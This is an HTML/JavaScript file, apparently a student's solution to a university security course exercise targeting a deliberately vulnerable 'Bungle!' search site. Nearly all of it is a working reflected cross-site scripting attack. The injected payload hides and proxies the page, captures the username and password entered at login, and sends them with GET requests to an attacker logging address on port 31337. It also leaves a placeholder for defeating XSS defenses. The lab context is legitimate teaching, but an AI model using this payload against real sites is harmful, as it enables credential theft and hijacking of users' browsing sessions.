<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script>
// Extend this function:

function payload(attacker) {
    function log(data) {
        console.log($.param(data));
        $.get(attacker, data);
    }
    function proxy(href, state) {
        if(state == "nav"){
            $("html").load(href, function(){
                $("html").show();                
                // alert('log event');
                log({event: state, uri: href});
                window.history.replaceState('', "Bungle!","./search");
            });
        } else if(state == "login"){
            $("html").load(state, function(){
                $("html").show();
                var username = $("#username").val();
                var password = $("#userpass").val();
                log({event: "login", user:username, pass: password});
                // window.history.replaceState('', "Bungle!","./search");
            });
        } else if(state == "logout"){
            $("html").load(href, function(){
                $("html").show();
                log({event: state, uri: href});
                window.history.replaceState('', "Bungle!","./search");
            });
        } else {
            $("html").load(href, function(){
                $("html").html($("html").html()+"<iframe id=\"frame1\" name=\"logFrame\"></iframe><form name=\"form1\" action=\"http://127.0.0.1:31337/\" method=\"get\" target=\"logFrame\"><input type=\"hidden\" name=\"work\" value=\"POOOOOOP\"></form>");
                $("html").show();                
                // alert('log event');
                log({event: state, uri: href});
                window.history.replaceState('', "Bungle!","./search");
            });
        }
    }
    var poop = $("#POOP").html();
    $("html").hide();
    alert("hi");
    proxy("./", "first");
    
    $(function(){
        
        $(".search-well form").submit(function(e){
            alert("POOP");
            e.preventDefault();
            var url = "/project2/search?xssdefense=0&q=" +
        encodeURIComponent("<div id=\"POOP\"><script" + ">" + payload.toString() +
        ";payload(\"" + attacker + "\");</script" + "></div>");
            $("html").load(url);
            // payload(attacker);
        });
        $(".well form").submit(function(e){
            alert("BUTT");
            e.preventDefault();
            proxy("./login", "login");
        });
        $("#search-again-btn").click(function(e){
            alert("POOPING AGAIN");
            
            e.preventDefault();
           // proxy("./", "nav");

        });
    });
}




function makeLink(xssdefense, target, attacker) {
    if (xssdefense == 0) {
        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
        encodeURIComponent("<div id=\"POOP\"><script" + ">" + payload.toString() +
        ";payload(\"" + attacker + "\");</script" + "></div>");
    } else {
        // Implement code to defeat XSS defenses here.
    }
}
var xssdefense = 0;
var target = "http://eecs388.org/project2/";
var attacker = "http://127.0.0.1:31337/";
$(function() {
var url = makeLink(xssdefense, target, attacker);
    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
});
</script>
<h3></h3>